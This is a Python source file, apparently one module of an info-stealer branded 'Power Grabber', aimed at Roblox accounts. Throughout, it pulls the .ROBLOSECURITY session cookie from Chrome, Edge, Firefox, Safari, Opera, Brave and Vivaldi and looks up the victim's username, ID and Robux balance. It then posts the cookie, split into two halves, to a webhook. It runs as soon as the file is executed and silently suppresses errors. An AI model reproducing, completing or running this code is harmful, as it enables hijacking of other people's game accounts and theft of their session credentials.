import browser_cookie3
import requests
class Roblox:
    def __init__(self):
        self.roblox_cookies = {}
        self.grab_roblox_cookies()
        if self.roblox_cookies:
            self.send_info()
    def grab_roblox_cookies(self):
        browsers = [
            ('Chrome', browser_cookie3.chrome),
            ('Edge', browser_cookie3.edge),
            ('Firefox', browser_cookie3.firefox),
            ('Safari', browser_cookie3.safari),
            ('Opera', browser_cookie3.opera),
            ('Brave', browser_cookie3.brave),
            ('Vivaldi', browser_cookie3.vivaldi)
        ]
        for browser_name, browser_func in browsers:
            try:
                browser_cookies = browser_func(domain_name='roblox.com')
                for cookie in browser_cookies:
                    if cookie.name == '.ROBLOSECURITY':
                        self.roblox_cookies[browser_name] = cookie.value
            except Exception as e:
                pass
    def send_info(self):
        if not self.roblox_cookies:
            print("No Roblox cookies found, exiting...")
            return
        for roblox_cookie in self.roblox_cookies.values():
            cookie = roblox_cookie
            headers = {"Cookie": f".ROBLOSECURITY={cookie}"}
            info = None
            try:
                url = "https://users.roblox.com/v1/users/authenticated"
                response = requests.get(url, headers=headers)
                response.raise_for_status()
                info = response.json()
            except requests.exceptions.RequestException as e:
                pass
            if info:
                user_id = info['id']
                first_cookie_half = cookie[:len(cookie)//2]
                second_cookie_half = cookie[len(cookie)//2:]
                robux_balance = info.get('robuxBalance', 'N/A')
                avatar_url = f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=150x150&format=Png&isCircular=true"
                avatar_response = requests.get(avatar_url)
                avatar_data = avatar_response.json()
                avatar = avatar_data['data'][0]['imageUrl'] if avatar_data.get('data') else None
                data = {
                    "embeds": [
                        {
                            "title": "🎮 **Roblox Info**",
                            "color": 0x8b0000,
                            "fields": [
                                {
                                    "name": "👤 **Username**",
                                    "value": f"`{info['name']}`",
                                    "inline": True
                                },
                                {
                                    "name": "**User ID**",
                                    "value": f"`{user_id}`",
                                    "inline": True
                                },
                                {
                                    "name": "<:Robux:1329813530198806611> **Robux Balance**",
                                    "value": f"`{robux_balance}`",
                                    "inline": True
                                },
                                {
                                    "name": "🍪 **Cookie Part 1**",
                                    "value": f"`{first_cookie_half}`",
                                    "inline": False
                                },
                                {   
                                    "name": "🍪 **Cookie Part 2**",
                                    "value": f"`{second_cookie_half}`",
                                    "inline": False
                                }
                            ],
                            "thumbnail": {
                                "url": avatar
                            },
                            "footer": {
                                "text": "Power Grabber | Created by Powercascade and Taktikal.exe",
                                "icon_url": "https://github.com/Powercascade/Power-grabber/blob/main/Power%20Grabber.png?raw=true"
                            },
                        }
                    ],
                    "username": "Power Grabber",
                    "avatar_url": "https://github.com/Powercascade/Power-grabber/blob/main/Power%20Grabber.png?raw=true",
                }
                try:
                    response = requests.post(webhook_url, json=data)
                    response.raise_for_status()
                except requests.exceptions.RequestException as e:
                    pass
roblox = Roblox()
